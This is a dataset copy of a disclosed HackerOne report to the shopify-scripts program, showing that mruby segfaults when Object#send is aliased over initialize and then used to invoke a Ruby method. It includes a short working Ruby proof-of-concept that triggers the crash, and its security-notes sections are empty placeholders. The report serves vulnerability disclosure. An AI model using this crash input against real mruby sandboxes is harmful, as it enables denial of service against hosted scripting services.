---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '183425'
original_report_id: '183425'
title: Segmentation fault when a Ruby method is invoked by a C method via Object#send
weakness: Uncontrolled Resource Consumption
team_handle: shopify-scripts
created_at: '2016-11-19T06:44:22.273Z'
disclosed_at: '2017-04-13T21:07:57.292Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Segmentation fault when a Ruby method is invoked by a C method via Object#send

## Metadata

- HackerOne Report ID: 183425
- Weakness: Uncontrolled Resource Consumption
- Program: shopify-scripts
- Disclosed At: 2017-04-13T21:07:57.292Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

We can arrange for C to call `Object#send` by aliasing it over `initialize`. This will cause `Class#new` (a C function) to call `#initialize` (which is actually `Object#send`) with arbitrary arguments.

If we invoke a Ruby method through `Object#send`, mruby segfaults:

```
def foo
end

class X
  alias_method :initialize, :send
end

X.new.send(:foo)
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
